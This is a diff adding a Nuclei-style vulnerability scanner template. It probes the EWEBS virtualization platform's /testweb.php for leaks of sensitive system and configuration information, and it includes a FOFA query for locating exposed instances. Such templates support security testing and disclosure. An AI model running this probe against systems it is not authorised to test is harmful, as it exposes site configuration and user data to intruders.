@@ -1,0 +1,27 @@
+id: ewebs-testweb-disclosure
+info:
+  name: 极通 EWEBS /testweb.php - 敏感信息泄露
+  author: leadlife
+  severity: medium
+  description: 极通EWEBS应用虚拟化平台/testweb.php文件信息泄露，可看到系统敏感信息，如：系统安装文件信息，配置信息等，造成用户信息，站点配置信息等敏感信息泄露。
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="新软科技-极通EWEBS"
+    hunter-query: demo
+  tags: ewebs,cms,disclousre
+
+http:
+  - raw:
+      - |
+        GET /testweb.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'access.log')
+        condition: and
